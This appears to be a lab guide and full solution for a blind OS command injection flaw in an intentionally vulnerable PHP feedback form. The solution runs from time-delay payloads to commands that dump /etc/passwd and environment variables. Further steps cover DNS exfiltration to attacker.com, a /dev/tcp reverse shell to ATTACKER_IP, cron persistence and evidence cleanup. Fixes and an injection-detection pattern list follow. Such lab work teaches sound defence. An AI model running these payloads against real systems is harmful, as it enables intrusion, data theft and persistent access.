# OS Command Injection with Time Delays - Lab Description

## Overview

This laboratory presents a blind OS command injection vulnerability in a PHP web application. The application executes shell commands containing user-provided data without proper validation.

## Application Architecture

### Technologies Used
- **Backend**: PHP 8.1 with Apache
- **Frontend**: HTML5, TailwindCSS (dark theme)
- **Containerization**: Docker with docker-compose
- **Port**: 3206

### Application Structure
- **Home page** (`index.php`): TechCorp company presentation
- **Feedback system** (`feedback.php`): Form vulnerable to command injection
- **Administration panel** (`admin.php`): Monitoring interface

## Vulnerability

### Location
The vulnerability is located in the `feedback.php` file at lines 15-17:

```php
$email_validation_cmd = "echo 'Validating email: " . $email . "'";
$output = shell_exec($email_validation_cmd);
```

### Mechanism
1. User submits a feedback form
2. The `email` parameter is directly concatenated into a shell command
3. The command is executed via `shell_exec()`
4. No validation or escaping is performed

### Vulnerability Type
- **Blind OS Command Injection**: Command output is not returned in the response
- **Time-based exploitation**: Exploitation is done via time delays

## Exploitation

### Objective
Cause a 10-second delay to confirm execution of arbitrary commands.

### Exploitation Payload
```
x||ping+-c+10+127.0.0.1||
```

### Payload Explanation
- `x`: Dummy value for the first echo
- `||`: Logical OR operator to execute the next command
- `ping+-c+10+127.0.0.1`: Ping command with 10 packets to localhost
- `||`: OR operator to continue execution

### Other Possible Payloads
```
x||sleep+10||
x||curl+-m+10+http://127.0.0.1:9999||
x||nc+-w+10+127.0.0.1+80||
```

## Detection Methods

### 1. Time-based Detection
- Submit payloads with increasing delays
- Observe response times
- Confirm execution through delays

### 2. Out-of-band Detection
- Use commands that generate network traffic
- Monitor network logs
- Use external services (DNS, HTTP)

### 3. Error-based Detection
- Test commands that generate errors
- Observe error messages in logs
- Analyze error responses

## Countermeasures

### 1. Input Validation
```php
// Strict email validation
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email");
}
```

### 2. Character Escaping
```php
// Escape special characters
$email = escapeshellarg($email);
```

### 3. Use Safe Alternatives
```php
// Use native PHP functions instead of shell_exec
$email_parts = explode('@', $email);
$domain = $email_parts[1] ?? '';
```

### 4. Whitelist
```php
// Allow only known domains
$allowed_domains = ['example.com', 'company.com'];
if (!in_array($domain, $allowed_domains)) {
    die("Unauthorized domain");
}
```

## Learning Scenarios

### Beginner Level
- Understand command injection concepts
- Identify injection points
- Test simple payloads

### Intermediate Level
- Exploit blind vulnerabilities
- Use time-based techniques
- Bypass security filters

### Advanced Level
- Develop custom payloads
- Bypass WAF
- Data exfiltration via OOB

## Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

# 🎯 COMPLETE WRITEUP - Detailed Solution

## Step 1: Reconnaissance

### 1.1 Application Analysis
The application presents three main pages:
- **Home page**: TechCorp presentation
- **Feedback form**: Vulnerable entry point
- **Administration panel**: Monitoring interface

### 1.2 Vulnerability Identification
By analyzing the source code of `feedback.php`, we identify the vulnerability:

```php
$email_validation_cmd = "echo 'Validating email: " . $email . "'";
$output = shell_exec($email_validation_cmd);
```

The `$email` parameter is directly concatenated into a shell command without validation.

## Step 2: Exploitation

### 2.1 Basic Test
Start by testing if injection works:

**Test payload:**
```
test@example.com; whoami
```

**Result:** No visible output (blind injection)

### 2.2 Confirmation via Time-based
Use a delay to confirm execution:

**Confirmation payload:**
```
test@example.com; sleep 5
```

**Result:** 5-second delay observed

### 2.3 Exploitation with Redirection
Use output redirection to extract information:

**Payload to extract /etc/passwd:**
```
test@example.com; cat /etc/passwd > /var/www/html/passwd.txt
```

**File access:**
```
http://localhost:3206/passwd.txt
```

## Step 3: Data Exfiltration

### 3.1 System File Extraction
```bash
# User list
test@example.com; cat /etc/passwd > /var/www/html/users.txt

# System information
test@example.com; uname -a > /var/www/html/system.txt

# Process list
test@example.com; ps aux > /var/www/html/processes.txt

# Environment variables
test@example.com; env > /var/www/html/environment.txt
```

### 3.2 File System Exploration
```bash
# List current directory
test@example.com; ls -la > /var/www/html/current_dir.txt

# Explore /etc
test@example.com; ls -la /etc > /var/www/html/etc_contents.txt

# Search for sensitive files
test@example.com; find / -name "*.conf" -type f 2>/dev/null > /var/www/html/config_files.txt
```

## Step 4: Advanced Techniques

### 4.1 Filter Bypass
If filters are in place, use bypass techniques:

```bash
# URL encoding
test@example.com; cat /etc/passwd | base64 > /var/www/html/passwd_b64.txt

# Variable usage
test@example.com; a=cat; b=/etc/passwd; $a $b > /var/www/html/passwd_var.txt

# Concatenation
test@example.com; c"a"t /etc/passwd > /var/www/html/passwd_concat.txt
```

### 4.2 DNS Exfiltration
```bash
# Use nslookup to exfiltrate data
test@example.com; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
```

### 4.3 Reverse Shell (Optional)
```bash
# Create a reverse shell
test@example.com; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

## Step 5: Post-Exploitation

### 5.1 Privilege Escalation
```bash
# Check sudo permissions
test@example.com; sudo -l > /var/www/html/sudo_perms.txt

# Search for SUID files
test@example.com; find / -perm -4000 2>/dev/null > /var/www/html/suid_files.txt
```

### 5.2 Persistence
```bash
# Create a cron job
test@example.com; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

## Step 6: Cleanup and Documentation

### 6.1 Evidence File Removal
```bash
# Remove created files
test@example.com; rm -f /var/www/html/*.txt
```

### 6.2 Exploit Documentation
Document all used payloads and obtained results for future reference.

## 🔧 Recommended Tools

### Testing Tools
- **Burp Suite**: Request interception and modification
- **OWASP ZAP**: Vulnerability scanner
- **Nmap**: Port and service discovery

### Automation Scripts
```python
import requests
import time

def test_injection(payload):
    data = {
        'name': 'Test',
        'email': payload,
        'message': 'Test message'
    }
    
    start_time = time.time()
    response = requests.post('http://localhost:3206/feedback.php', data=data)
    end_time = time.time()
    
    return end_time - start_time

# Delay test
delay = test_injection('test@example.com; sleep 5')
print(f"Observed delay: {delay} seconds")
```

## 🛡️ Recommended Countermeasures

### 1. Strict Validation
```php
// Strict email validation
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email");
}

// Domain whitelist
$allowed_domains = ['example.com', 'company.com'];
$domain = substr(strrchr($email, "@"), 1);
if (!in_array($domain, $allowed_domains)) {
    die("Unauthorized domain");
}
```

### 2. Proper Escaping
```php
// Use escapeshellarg for all inputs
$email = escapeshellarg($email);
$name = escapeshellarg($name);
$message = escapeshellarg($message);
```

### 3. Safe Alternatives
```php
// Use native PHP functions
$email_parts = explode('@', $email);
$domain = $email_parts[1] ?? '';

// Domain validation
if (!checkdnsrr($domain, 'MX')) {
    die("Invalid domain");
}
```

### 4. Monitoring and Logging
```php
// Log all injection attempts
$suspicious_patterns = [';', '|', '&', '`', '$('];
foreach ($suspicious_patterns as $pattern) {
    if (strpos($email, $pattern) !== false) {
        error_log("Injection attempt detected: " . $email);
        die("Unauthorized character detected");
    }
}
```

## 📊 Security Metrics

### Response Time
- **Normal**: < 1 second
- **Injection detected**: > 5 seconds
- **Successful exploitation**: Delay corresponding to payload

### Created Files
- **passwd.txt**: User list
- **system.txt**: System information
- **processes.txt**: Running processes
- **environment.txt**: Environment variables

## 🎯 Learning Objectives Achieved

✅ **Understanding of blind injections**
✅ **Mastery of redirection techniques**
✅ **Time-based exploitation**
✅ **Data exfiltration**
✅ **Filter bypass**
✅ **Post-exploitation**

---

*This writeup demonstrates a complete exploitation of the blind OS command injection vulnerability with output redirection.* 